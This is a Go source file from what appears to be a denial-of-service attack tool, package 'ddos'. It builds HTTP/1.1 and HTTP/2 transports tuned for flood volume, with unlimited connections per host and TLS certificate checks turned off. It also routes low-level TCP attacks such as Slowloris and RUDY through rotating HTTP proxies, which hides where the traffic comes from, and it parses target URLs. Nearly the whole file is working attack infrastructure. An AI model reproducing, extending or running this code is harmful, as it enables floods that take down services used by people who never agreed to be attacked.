package ddos

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"

	"golang.org/x/net/http2"
)

// createHTTP2Transport creates an HTTP/2 enabled transport
func (d *DDoSAttack) createHTTP2Transport() (*http.Transport, error) {
	tlsConfig := d.createTLSConfig()
	// Optimize MaxIdleConns to MaxThreads * 3 for HTTP/2 mode
	maxIdleConns := d.config.MaxThreads * 3
	if maxIdleConns < 3000 {
		maxIdleConns = 3000 // Minimum for high-throughput HTTP/2
	}
	transport := &http.Transport{
		TLSClientConfig:     tlsConfig,
		MaxIdleConns:        maxIdleConns,
		MaxConnsPerHost:     0, // Unlimited connections per host
		DisableKeepAlives:   false, // Always reuse connections
		DisableCompression:  true,  // Disable compression for efficiency
		DialContext: (&net.Dialer{
			Timeout:   d.config.Timeout,
			KeepAlive: 15 * time.Second, // Reduced from 30s for faster connection turnover
		}).DialContext,
	}

	// Configure HTTP/2
	if err := http2.ConfigureTransport(transport); err != nil {
		return nil, fmt.Errorf("failed to configure HTTP/2: %w", err)
	}

	return transport, nil
}

// createHTTP1Transport creates a standard HTTP/1.1 transport
func (d *DDoSAttack) createHTTP1Transport(numWorkers int) *http.Transport {
	tlsConfig := d.createTLSConfig()
	// Optimize MaxIdleConns to numWorkers * 2 for better connection reuse
	maxIdleConns := numWorkers * 2
	if maxIdleConns < 2000 {
		maxIdleConns = 2000 // Minimum for high-throughput
	}
	return &http.Transport{
		TLSClientConfig:     tlsConfig,
		MaxIdleConns:        maxIdleConns,
		MaxIdleConnsPerHost: numWorkers,
		MaxConnsPerHost:     0, // Unlimited connections per host
		IdleConnTimeout:     60 * time.Second, // Increased from 30s for better reuse
		DisableKeepAlives:   false,            // Always reuse connections
		DisableCompression:  true,             // Disable compression for efficiency
		DialContext: (&net.Dialer{
			Timeout:   d.config.Timeout,
			KeepAlive: 15 * time.Second, // Reduced from 30s for faster connection turnover
		}).DialContext,
	}
}

// createTLSConfig creates a TLS config (simplified)
func (d *DDoSAttack) createTLSConfig() *tls.Config {
	return &tls.Config{
		InsecureSkipVerify: true,
	}
}

// dialThroughHTTPProxy establishes a TCP (optionally TLS-wrapped) connection to the
// target host:port through an HTTP proxy using the CONNECT method.
//
// This helper is used by low-level TCP attacks (e.g. Slowloris, RUDY) so they can
// reuse the same proxy rotation and health-checking logic as the HTTP flood modes.
func (d *DDoSAttack) dialThroughHTTPProxy(
	dialer *net.Dialer,
	proxyURL string,
	targetHost string,
	targetPort string,
	useTLS bool,
) (net.Conn, error) {
	parsed, err := url.Parse(proxyURL)
	if err != nil {
		return nil, fmt.Errorf("invalid proxy URL %q: %w", proxyURL, err)
	}

	// Only plain HTTP proxies are supported for raw TCP attacks.
	if parsed.Scheme != "http" {
		return nil, fmt.Errorf("unsupported proxy scheme %q for raw TCP attacks", parsed.Scheme)
	}

	proxyHost := parsed.Host
	if !strings.Contains(proxyHost, ":") {
		// Default to port 80 when not specified
		proxyHost = net.JoinHostPort(parsed.Hostname(), "80")
	}

	// Connect to proxy
	conn, err := dialer.Dial("tcp", proxyHost)
	if err != nil {
		return nil, fmt.Errorf("failed to connect to proxy %q: %w", proxyHost, err)
	}

	targetAddr := net.JoinHostPort(targetHost, targetPort)

	// Send CONNECT request
	connectReq := fmt.Sprintf(
		"CONNECT %s HTTP/1.1\r\nHost: %s\r\nProxy-Connection: keep-alive\r\n\r\n",
		targetAddr,
		targetAddr,
	)

	if _, err := conn.Write([]byte(connectReq)); err != nil {
		conn.Close()
		return nil, fmt.Errorf("failed to write CONNECT request: %w", err)
	}

	// Read proxy response headers
	br := bufio.NewReader(conn)

	statusLine, err := br.ReadString('\n')
	if err != nil {
		conn.Close()
		return nil, fmt.Errorf("failed to read proxy response: %w", err)
	}

	// Expect 200 status for successful tunnel
	if !strings.Contains(statusLine, "200") {
		// Drain remaining headers before closing
		for {
			line, err := br.ReadString('\n')
			if err != nil || line == "\r\n" || line == "\n" {
				break
			}
		}
		conn.Close()
		return nil, fmt.Errorf("proxy CONNECT failed: %s", strings.TrimSpace(statusLine))
	}

	// Drain the rest of the headers
	for {
		line, err := br.ReadString('\n')
		if err != nil {
			if err == io.EOF {
				break
			}
			conn.Close()
			return nil, fmt.Errorf("failed reading proxy headers: %w", err)
		}
		if line == "\r\n" || line == "\n" {
			break
		}
	}

	// At this point we have a tunnel to targetHost:targetPort over conn.
	if !useTLS {
		return conn, nil
	}

	// Wrap the tunneled connection with TLS.
	tlsConfig := d.createTLSConfig()
	tlsConn := tls.Client(conn, tlsConfig)
	if err := tlsConn.Handshake(); err != nil {
		conn.Close()
		return nil, fmt.Errorf("TLS handshake over proxy failed: %w", err)
	}

	return tlsConn, nil
}

// shouldUseTLS determines if TLS should be used based on URL
func (d *DDoSAttack) shouldUseTLS(targetURL string) (bool, string, string) {
	// Check if URL uses HTTPS
	if strings.HasPrefix(targetURL, "https://") {
		return true, "443", targetURL
	}

	return false, "80", targetURL
}

// parseTargetURL extracts host, port, and path from target URL
func (d *DDoSAttack) parseTargetURL(targetURL string, useTLS bool) (host, port, path string) {
	// Remove scheme
	host = targetURL
	if strings.HasPrefix(host, "https://") {
		host = strings.TrimPrefix(host, "https://")
	} else if strings.HasPrefix(host, "http://") {
		host = strings.TrimPrefix(host, "http://")
	}

	// Extract path
	if idx := strings.Index(host, "/"); idx != -1 {
		path = host[idx:]
		host = host[:idx]
	} else {
		path = "/"
	}

	// Extract port
	port = "80"
	if useTLS {
		port = "443"
	}
	if idx := strings.Index(host, ":"); idx != -1 {
		port = host[idx+1:]
		host = host[:idx]
	}

	return host, port, path
}

